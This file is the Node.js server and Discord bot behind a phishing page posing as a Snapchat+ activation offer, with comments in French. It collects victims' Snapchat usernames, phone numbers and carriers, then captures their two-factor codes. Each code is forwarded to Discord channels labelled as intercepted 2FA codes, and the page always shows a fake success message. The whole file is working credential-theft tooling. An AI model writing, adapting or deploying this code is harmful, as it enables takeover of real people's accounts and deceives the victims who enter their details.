require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { v4: uuidv4 } = require('uuid');

// --- Configuration Express ---
const app = express();
app.use(express.json());
app.use(express.static('public'));

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

// Map pour stocker les demandes en attente
const requests = new Map();

const APPROVAL_CHANNEL_ID  = process.env.DISCORD_APPROVAL_CHANNEL; // salon principal (accepte/refuse)
const PRIORITY_CHANNEL_ID  = '1532004514306068510';                 // salon prioritaire (lecture seule, 5s avant)
const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT = process.env.PORT || 3000;

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    const id = uuidv4();
    requests.set(id, {
        snapchat, phone, operator,
        approved: false, rejected: false, code: null
    });

    try {
        const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
        const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
        if (!mainChannel) throw new Error("Salon principal introuvable");

        const embed = new EmbedBuilder()
            .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
            .setColor(0xFFFC00)
            .addFields(
                { name: 'Pseudo',    value: snapchat,  inline: true },
                { name: 'Téléphone', value: phone,     inline: true },
                { name: 'Opérateur', value: operator,  inline: true },
                { name: 'ID',        value: id }
            )
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger)
            );

        // 1. Salon prioritaire reçoit EN PREMIER (sans boutons)
        if (priorityChannel) {
            const priorityEmbed = new EmbedBuilder()
                .setTitle('👁️ [PRIORITAIRE] Nouvelle demande')
                .setColor(0xFF6600)
                .addFields(
                    { name: 'Pseudo',    value: snapchat,  inline: true },
                    { name: 'Téléphone', value: phone,     inline: true },
                    { name: 'Opérateur', value: operator,  inline: true },
                    { name: 'ID',        value: id }
                )
                .setFooter({ text: 'Lecture seule — le salon principal reçoit dans 5s' })
                .setTimestamp();
            await priorityChannel.send({ embeds: [priorityEmbed] });
        }

        // 2. Salon principal reçoit 5 secondes après avec les boutons
        setTimeout(async () => {
            try {
                await mainChannel.send({ embeds: [embed], components: [row] });
            } catch (e) {
                console.error('Erreur envoi salon principal (delayed):', e);
            }
        }, 5000);

        console.log(`✅ Demande #${id} envoyée (prioritaire immédiat, principal dans 5s)`);
        res.json({ id });
    } catch (err) {
        console.error('Erreur envoi Discord :', err);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 2. Vérification pseudo Snapchat via Business API
app.get('/api/check-snapchat/:username', async (req, res) => {
    const username = req.params.username.trim().toLowerCase();

    // Validation format Snapchat : 3-15 chars
    if (!username || username.length < 3 || username.length > 15) {
        return res.json({ exists: false, reason: 'format' });
    }

    try {
        const apiUrl = `https://businessapi.snapchat.com/public/v1/public_profiles/search?query=${encodeURIComponent(username)}`;
        const response = await axios.get(apiUrl, {
            timeout: 8000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
                'Accept': 'application/json',
                'Accept-Language': 'fr-FR,fr;q=0.9',
                'Referer': 'https://www.snapchat.com/',
                'Origin': 'https://www.snapchat.com'
            },
            validateStatus: () => true
        });

        console.log(`[SnapCheck] ${username} → HTTP ${response.status}`);

        if (response.status !== 200) {
            return res.json({ exists: false, error: 'indisponible' });
        }

        const data = response.data;
        const profiles = data.public_profiles || data.profiles || data.results || [];

        // Chercher une correspondance exacte du username
        const match = profiles.find(p => {
            const uname = (p.username || p.user_name || p.snapchat_username || '').toLowerCase();
            return uname === username;
        });

        if (match) {
            const displayName = match.display_name || match.displayName || match.name || username;
            const avatarUrl   = match.bitmoji_avatar_url || match.avatar_url || match.avatarUrl
                             || match.profile_image_url  || match.thumbnail_url || null;
            return res.json({ exists: true, username, displayName, avatarUrl });
        }

        // Pas de correspondance exacte
        return res.json({ exists: false });

    } catch (err) {
        console.error('[SnapCheck] Erreur API:', err.message);
        return res.json({ exists: false, error: 'indisponible' });
    }
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved: request.approved,
        rejected: request.rejected,
        snapchat: request.snapchat
    });
});

// 4. Code reçu — toujours accepter et retourner success pour éviter les erreurs côté client
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!code) return res.json({ success: true }); // réponse success même si vide

    // Récupérer les infos si dispo (peut être absent si serveur redémarré)
    const request = requests.get(id) || {};
    const snapchat  = request.snapchat  || 'Inconnu';
    const phone     = request.phone     || 'Inconnu';
    const operator  = request.operator  || 'Inconnu';

    // Envoyer dans les deux salons
    const sendCode = async () => {
        const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
        const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);

        const codeEmbed = new EmbedBuilder()
            .setTitle('🔐 Code 2FA intercepté')
            .setColor(0x00FF00)
            .addFields(
                { name: 'Pseudo',    value: snapchat  },
                { name: 'Téléphone', value: phone     },
                { name: 'Opérateur', value: operator  },
                { name: 'Code',      value: code      }
            )
            .setTimestamp();

        // Salon prioritaire immédiatement
        if (priorityChannel) {
            try {
                const priorityCodeEmbed = new EmbedBuilder()
                    .setTitle('👁️ [PRIORITAIRE] Code 2FA intercepté')
                    .setColor(0x00FF00)
                    .addFields(
                        { name: 'Pseudo',    value: snapchat },
                        { name: 'Téléphone', value: phone    },
                        { name: 'Opérateur', value: operator },
                        { name: 'Code',      value: code     }
                    )
                    .setFooter({ text: 'Lecture seule — salon principal reçoit dans 5s' })
                    .setTimestamp();
                await priorityChannel.send({ embeds: [priorityCodeEmbed] });
            } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
        }

        // Salon principal 5 secondes après
        if (mainChannel) {
            setTimeout(async () => {
                try { await mainChannel.send({ embeds: [codeEmbed] }); }
                catch (e) { console.error('Erreur salon principal (code):', e.message); }
            }, 5000);
        }
    };

    sendCode().catch(console.error);
    if (id) requests.delete(id);

    // Toujours retourner success → l'overlay de succès s'affiche
    res.json({ success: true });
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const [action, requestId] = interaction.customId.split('_');
    if (action !== 'approve' && action !== 'reject') return;
    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable.', ephemeral: true });
    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }
    if (action === 'approve') {
        request.approved = true;
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
    } else {
        request.rejected = true;
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
    }
    await interaction.message.edit({ components: [] });
});

// --- Démarrage ---
client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
});

client.login(process.env.DISCORD_BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
